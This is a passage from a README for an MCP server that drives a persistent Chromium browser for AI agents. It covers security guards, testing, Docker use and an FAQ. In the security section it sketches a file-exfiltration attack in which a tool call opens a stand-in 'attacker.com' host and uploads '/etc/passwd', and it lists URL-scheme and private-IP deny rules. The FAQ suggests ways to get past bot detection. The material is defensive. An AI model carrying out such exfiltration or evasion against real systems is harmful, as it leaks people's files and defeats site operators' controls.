- **Timing-safe auth.** API key comparison uses `crypto.timingSafeEqual` so
  token guessing doesn't benefit from short-circuit string comparison.
- **Session cap.** `max_sessions` (default 50) prevents resource exhaustion.
- **Profile-name regex.** `^[a-zA-Z0-9_-]{1,64}$` — enforced at the HTTP
  layer, so `../../etc/passwd` can't escape the profile base directory.

### Tool-level guards

The tool surface (`browser_open`, `browser_save`, `browser_upload`, etc.)
can otherwise turn a reachable `/mcp` endpoint into a local file read /
write primitive. Default-deny, opt-in where you need it:

- **URL allowlist for navigation.** `browser_open`, `browser_download_wait`
  (action=navigate), and `browser_permissions` (origin) accept only `http:`,
  `https:`, and `about:blank` by default. `file://`, `javascript:`, `data:`,
  `chrome:`, `view-source:`, and raw private-IP hosts (`127.0.0.0/8`,
  `10/8`, `172.16–31/12`, `192.168/16`, `169.254/16`, `::1`, `fc00::/7`,
  `fe80::/10`) are rejected. Opt in via:
  - `BROWSER_MCP_ALLOW_FILE_URLS=1` — allow `file://` (for local fixtures).
  - `BROWSER_MCP_ALLOW_PRIVATE_NETWORKS=1` — allow loopback / intranet /
    cloud-metadata IPs. Required for Docker-compose setups that curl each
    other by service name.
- **Download / save sandbox.** `browser_save` and `browser_download_wait`
  write into `~/.browser-mcp/downloads/<profile>/` by default. Relative
  paths resolve against the sandbox; absolute paths that escape it are
  rejected. `BROWSER_MCP_ALLOW_ANY_WRITE_PATH=1` disables the sandbox.
- **Upload sandbox.** `browser_upload` reads from
  `~/.browser-mcp/uploads/<profile>/`. Drop files there first, or set
  `BROWSER_MCP_ALLOW_ANY_UPLOAD_PATH=1`. Without this, one `browser_open(
  attacker.com)` + `browser_upload({ files: ["/etc/passwd"] })` exfiltrates
  any file your uid can read.
- **Sandbox base dir.** Override both sandboxes' root via
  `BROWSER_MCP_SANDBOX_DIR` (defaults to `~/.browser-mcp`).
- **Log redaction.** Tool args containing cookie values, typed text, JS
  expressions, and filesystem paths are redacted in `withLog` stderr output
  so centralized log collectors don't pick up passwords or session tokens.
- **`browser_evaluate` result cap.** Output truncated at
  `BROWSER_MCP_MAX_CHARS` (50 000 by default) so a page returning a 1 GB
  array can't OOM the supervisor.

### Not-attack-surface by construction

- **No remote code execution on the supervisor.** There is no `eval` /
  `child_process` / `vm` / `Function()` anywhere in `src/`. `browser_evaluate`
  runs JS in Chromium's renderer sandbox, not on the supervisor.
- **Env isolation.** `BROWSER_MCP_*` env vars (API key, host, caps) are
  filtered out before Chromium is launched, so page scripts can't
  fingerprint the supervisor config.

Docker image binds to `0.0.0.0` and **requires** an API key — the
refuse-to-start check kicks in without one.

### Health endpoint

`GET /health` returns JSON with status, uptime, session/profile counts, and a
summary of active config. Unauthenticated, safe to probe. Does not reveal
URLs visited, cookies, or any page content.

```json
{
  "status": "ok",
  "uptime_ms": 123456,
  "sessions": 2,
  "profiles": 1,
  "config": { "host": "127.0.0.1", "port": 7777, "headless": true, "stealth": true, "auth": "on" }
}
```

---

## Testing

```bash
npm test                  # run 304 tests once (vitest)
npm run test:watch        # watch mode
npm run test:coverage     # run + coverage report under coverage/
npm run test:integration  # Playwright-backed tests only
```

The suite is split across 26 files:

- **Unit** (11 files): pure-logic tests for `render.ts` (compact helpers),
  AX-tree manipulation (`cdpAxToTree` with synthetic CDP payloads,
  `filterCompact`, `diffSnapshots`, `collapseRedundantText`, `renderAxNode`),
  `config.ts` helpers, `log.ts`, `lib/auth.ts`, netlog ring buffer,
  `resolveLocator` routing, `insecureStartupProblem` gate, and mock-driven
  tool handlers for edge branches (snapshot diff overflow, cookies no-flags,
  PDF headless error, download failure, permissions without http origin).
- **Integration** (15 files): drive a real headless Chromium via
  `BrowserManager` against local HTML fixtures. Covers every tool handler,
  `BrowserManager`'s public surface, the HTTP server (CSRF / auth / session
  lifecycle / MCP JSON-RPC / session cap), and the AX-tree pipeline end-to-end.
  An in-process HTTP test server exercises 2xx/4xx/5xx branches and failed
  network entries.

Integration tests use `BROWSER_MCP_HEADLESS=1` and a throwaway profile
directory under `os.tmpdir()` — your local `~/.browser-mcp/profiles/` is not
touched. Set `SKIP_INTEGRATION=1` to skip the Playwright-backed suite
(useful on environments with no Chromium).

Coverage targets (vitest.config.ts): 90% lines / 85% functions / 80% branches /
90% statements. The ceiling is bounded by Playwright — code inside
`page.evaluate(() => …)` runs in Chromium's V8, not Node's, so those blocks
can't be instrumented even when the integration tests exercise them
end-to-end.

CI runs the full suite on every push (Linux; `npx playwright install
--with-deps chromium` in the workflow).

---

## Docker

```bash
docker build -t browser-mcp .
docker run --rm -p 7777:7777 -e BROWSER_MCP_API_KEY=$(openssl rand -hex 32) browser-mcp
```

Or with compose:

```bash
# one-time: create a .env file next to docker-compose.yml with a real key
echo "BROWSER_MCP_API_KEY=$(openssl rand -hex 32)" > .env
docker compose up
```

Pre-built images from GHCR:

```bash
docker run --rm -p 7777:7777 -e BROWSER_MCP_API_KEY=$(openssl rand -hex 32) \
  ghcr.io/graph-memory/browser-mcp:latest
```

The container:
- Uses `tini` as PID 1 for zombie reaping when Chromium subprocesses die.
- Runs Chromium as a dedicated non-root `browser` user.
- Persists profiles in a Docker volume (`browser`) at `/home/browser/.browser-mcp`.
- Uses Playwright's bundled Chromium (`BROWSER_MCP_CHANNEL=chromium` set
  automatically — `chrome` channel isn't available inside the image).
- Healthcheck: `node -e "fetch('http://127.0.0.1:7777/health')…"` every 30 s.
- Refuses to start without `BROWSER_MCP_API_KEY` (the image binds to
  `0.0.0.0`, so the refuse-to-start guard kicks in).

**`browser_open_visible` does not work in Docker** (no display server). Use
it only in local/desktop setups.

---

## Platform notes

- **macOS / Linux / Windows** — Node ≥ 22. Playwright installs Chromium on
  first run via the package's `postinstall` hook.
- **`chrome` channel** requires a locally-installed Chrome. On systems
  without it, use `--channel=chromium` to fall back to Playwright's bundled
  build. The Docker image sets this automatically.
- **Sandboxed Linux containers** may need extra caps for Chromium sandbox.
  The official Dockerfile handles this; if you're using a different base
  image, ensure `libnss3 libdbus-1-3 libgbm1 libasound2 libatk-bridge2.0-0`
  (and friends) are installed.

---

## Development

```bash
git clone https://github.com/graph-memory/browser-mcp.git
cd browser-mcp
npm install
npm run dev         # run with tsx (no build step)
npm run build       # compile TypeScript to dist/
npm test            # full test suite (304 tests)
npm run test:coverage
```

### Release process

```bash
# bump version
npm version patch   # or minor / major

# push with tag
git push && git push --tags
```

Triggers `publish.yml` (npm publish) and `docker.yml` (image build). Both
run the full test suite first.

---

## FAQ

**Does this replace `WebFetch`?** No — they're complementary. `WebFetch` is
great for one-shot reads of public pages. browser-mcp is for sessions,
authentication, interaction, and anything that needs JavaScript / cookies /
state.

**Why Playwright and not Puppeteer?** Playwright has better role/label
locators (Accessibility tree first-class), auto-waiting, and cross-browser
support (though we only ship Chromium). Also the API has been more stable
over the past year.

**Can I run multiple browser-mcp instances on the same machine?** Yes —
each on its own port (`--port`). They're independent processes with no
shared state. Different profile base directories (`--profile-dir`) if you
want isolation.

**How do I log in to a site that blocks headless browsers?** Run
`browser_open_visible` with the login URL. Chromium opens visibly with the
persistent profile so you can solve CAPTCHAs / 2FA. Close the window when
done — cookies land in the profile. Subsequent calls from your agent run
headless against the same profile and inherit the session.

**Where are profile data stored?** `~/.browser-mcp/profiles/<name>/` by
default (override via `--profile-dir` / `BROWSER_MCP_PROFILE_DIR`). These
are standard Chromium `user-data-dir`s — cookies.sqlite, Local Storage,
Service Worker caches, etc. Safe to delete to reset a profile.

**The same profile is open in my regular Chrome — can browser-mcp attach?**
No. Chromium locks its user-data-dir with a singleton file; only one
process can use a profile at a time. Either close your Chrome or use a
dedicated browser-mcp profile.

**`browser_save pdf` says "only headless"?** Known Playwright/Chromium
limitation — print-to-PDF requires the headless browser. If you've disabled
headless mode (`--no-headless`), switch to `mhtml` (single-file archive) or
`html` (raw).

**How do I bypass a specific site's bot detection?** Start with the default
stealth plugin on. If that fails, try `--no-stealth` (some sites detect
stealth itself). Otherwise, fingerprinting is an arms race you're unlikely
to win with a generic tool — consider a residential proxy
(`--proxy socks5://user:pass@host:port`) or manual sessions via
`browser_open_visible`.

**Can I intercept / mock network requests?** Not yet. Currently you can
only *observe* requests via `browser_network_log`. Intercept/mock is
intentionally excluded for now — it's a large surface and hasn't come up
as a blocker in real use.

**Can I record my session as a Playwright script?** Not yet. Same scope
decision as network intercept.

**Why no `test:windows` in CI?** Not yet wired up. The code has no POSIX
specifics outside the Dockerfile, so Windows should work — it's just not
validated by CI.

---

## License

[Elastic License 2.0 (ELv2)](LICENSE)
